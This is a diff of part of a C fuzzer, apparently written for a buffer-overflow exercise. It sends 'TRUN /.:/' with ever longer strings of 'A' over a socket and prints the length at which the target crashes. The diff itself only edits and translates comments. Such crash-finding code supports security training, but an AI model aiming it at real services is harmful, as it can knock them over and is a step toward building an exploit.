@@ -42,10 +42,12 @@ int main() {
                                     For example, after increasing 100 times in this loop and exiting the loop, 
                                     nm will be 200 when it comes back to this loop after increasing it 100 times. This way it will increase. 
                                 */
-                                strcat(buff, "A"); // Here it adds nm+8 times A to the buff variable. For example, the result would be something like: TRUN /.:/AAAAAAAAAAAAAA.
-                                printf("Buff Lenght: %d\n", strlen(buff));  // Burada program hangi uzunlukta crash verdiğini görebilmek için buff değişkenin sürekli aktif olarak uzunluğu ekrana bastırılıyor
+                                strcat(buff, "A"); /*
+                                Here it adds nm+8 times A to the buff variable. For example, the result would be something like: TRUN /.:/AAAAAAAAAAAAAA.
+                                */
+                                printf("Buff Lenght: %d\n", strlen(buff)); // Here the length of the buff variable is actively printed to the screen.
                              }
-                             int wr = write(scket, buff, sizeof(buff)); // Here, the length of the buff variable is actively suppressed to the screen so that the program can see how long it crashes.
+                             int wr = write(scket, buff, sizeof(buff)); 
                                 if (wr == -1) {
                                     printf("Crashed At......");
                                     close(scket);
